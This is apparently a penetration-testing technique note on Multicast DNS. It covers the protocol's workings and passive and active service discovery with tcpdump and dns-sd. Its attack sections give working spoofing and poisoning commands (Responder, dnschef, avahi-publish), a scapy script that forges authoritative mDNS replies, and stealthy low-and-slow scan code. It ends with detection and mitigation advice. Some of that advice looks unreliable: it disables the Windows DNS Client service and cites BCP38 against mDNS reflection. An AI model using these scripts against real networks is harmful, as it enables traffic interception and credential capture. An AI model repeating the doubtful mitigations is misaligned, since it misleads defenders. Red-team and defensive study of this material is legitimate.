---
tags:
  - "#type/technique"
  - "#tactic/TA0007"
  - "#technique/T1557"
  - "#stage/discovery"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#os/linux"
  - "#os/macos"
  - "#tool/responder"
  - "#tool/dnschef"
  - "#protocol/dns"
aliases:
  - Multicast DNS
  - Zero-Configuration Networking
  - Bonjour
  - Avahi
  - DNS-SD
---
## Technique
___
Multicast DNS (mDNS) is a protocol that resolves hostnames to IP addresses within small networks without a local name server. Operating on the link-local scope (typically 169.254.0.0/16 for IPv4 or fe80::/10 for IPv6), mDNS uses IP multicast addressing to enable devices to resolve .local domain names and discover network services.

mDNS operates by multicasting queries to the reserved address 224.0.0.251 on UDP port 5353. When a device sees a query for its own name, it multicasts a response with its IP address. This makes mDNS useful for local network discovery but also introduces security concerns as it can be abused for reconnaissance and man-in-the-middle attacks.

Often implemented alongside DNS Service Discovery (DNS-SD), mDNS allows attackers to discover available services, potentially revealing sensitive information about the network infrastructure, and can be leveraged for spoofing and poisoning attacks.

## Prerequisites
___

**Access Level:** Network access to the target environment where mDNS is used.

**System State:** mDNS implementation must be active in the target environment:
- Windows: Enabled by default in modern versions
- macOS: Enabled by default (Bonjour)
- Linux: Often enabled via Avahi daemon
- IoT devices: Commonly enabled for easy discovery

**Information:** Understanding of basic networking concepts and the mDNS protocol.

## Considerations
___

**Impact**

mDNS can be leveraged for network reconnaissance, information gathering, spoofing, and poisoning attacks. Since it operates on a local network level without authentication mechanisms, it presents a significant attack surface for insider threats or attackers who have already gained initial access to the network.

**OPSEC**

- **Network Visibility:** mDNS queries and responses generate traffic that may be visible to network monitoring tools.
  
- **Response Rate Limiting:** Some modern mDNS implementations have throttling mechanisms to prevent flooding attacks, which may limit the effectiveness of aggressive scanning.
  
- **Network Segmentation:** mDNS is typically constrained to broadcast domains, meaning Layer 3 boundaries (routers) will usually block this traffic unless specifically configured to forward it.

## Execution
___
### Passive Discovery

#### **tcpdump**

Capture mDNS traffic:

```bash
sudo tcpdump -i eth0 udp port 5353 -vv
```

#### **Wireshark**

Filter for mDNS traffic:

```
udp.port == 5353
```

### Active Discovery

#### **dns-sd (macOS/Linux)**

Query for available services:

```bash
dns-sd -B _services._dns-sd._udp local
```

Enumerate a specific service type:

```bash
dns-sd -B _http._tcp local
```

#### **mDNS-scan**

Scan network for mDNS-enabled devices:

```bash
mdns-scan
```

### mDNS Spoofing

#### **Responder**

Configure and run Responder to intercept mDNS queries:

```bash
sudo responder -I eth0 -wF
```

For more targeted attacks, edit the Responder.conf file to enable specific mDNS spoofing:

```bash
nano /etc/responder/Responder.conf
# Set mDNS = On
```

#### **dnschef**

Run dnschef to intercept and manipulate mDNS queries:

```bash
sudo dnschef --interface 0.0.0.0 --port 5353 --fakeip 192.168.1.100 --fakedomains *.local
```

### mDNS Poisoning

#### **Custom Python Script**

Using scapy to forge mDNS responses:

```python
from scapy.all import *

def send_fake_mdns_response():
    # Create Ethernet header
    eth = Ether()
    
    # Create IP header
    ip = IP(dst="224.0.0.251")
    
    # Create UDP header
    udp = UDP(sport=5353, dport=5353)
    
    # Create DNS header and payload
    dns = DNS(
        id=0,
        qr=1,  # This is a response
        aa=1,  # Authoritative Answer
        rd=0,  # Recursion Desired
        ra=0,  # Recursion Available
        z=0,  # Reserved
        ad=0,  # Authentic Data
        cd=0,  # Checking Disabled
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        qd=DNSQR(qname="target-device.local", qtype="A", qclass="IN"),
        an=DNSRR(rrname="target-device.local", type="A", rclass="IN", ttl=120, rdata="192.168.1.100")
    )
    
    # Assemble packet
    pkt = eth / ip / udp / dns
    
    # Send packet
    sendp(pkt, iface="eth0", loop=0, verbose=1)

send_fake_mdns_response()
```

#### **Avahi (Linux)**

Create a malicious service advertisement:

```bash
avahi-publish -a "target-device.local" 192.168.1.100 --ttl 120
```

### Defense Evasion

#### **Targeted mDNS Queries**

To avoid detection by network monitoring, limit queries to specific hostnames:

```bash
dig @224.0.0.251 -p 5353 +short specific-host.local
```

#### **Low-and-Slow Approach**

Implement timing delays between mDNS requests:

```python
import time
from scapy.all import *

def stealthy_mdns_scan(targets):
    for target in targets:
        pkt = IP(dst="224.0.0.251")/UDP(sport=5353, dport=5353)/DNS(rd=0, qd=DNSQR(qname=target+".local", qtype="A"))
        send(pkt, verbose=0)
        time.sleep(5)  # Wait 5 seconds between queries

stealthy_mdns_scan(["printer", "fileserver", "nas"])
```

## Detection & Mitigation
___

#### Detection

- Monitor for unusual mDNS traffic volumes or patterns
- Look for mDNS queries for non-existent services
- Deploy network monitoring tools that can detect mDNS spoofing attempts
- Watch for duplicate responses to the same mDNS query with different answers
- Monitor for devices responding to mDNS queries that they shouldn't be answering

#### Mitigation

- **Disable mDNS:** If not needed, disable mDNS services on endpoints.
  
  Windows:
  ```powershell
  Set-Service "DNSCache" -StartupType Disabled
  Stop-Service "DNSCache"
  ```
  
  Linux:
  ```bash
  sudo systemctl stop avahi-daemon
  sudo systemctl disable avahi-daemon
  ```

- **Network Segmentation:** Implement proper network segmentation to contain mDNS traffic to necessary segments only.

- **Firewall Rules:** Block mDNS traffic (UDP port 5353) at network boundaries and between security zones.

- **mDNS Reflection Prevention:** Configure networks to prevent mDNS reflection attacks by implementing BCP38 filtering.

- **Use Secure Alternatives:** Where possible, replace mDNS with more secure service discovery mechanisms.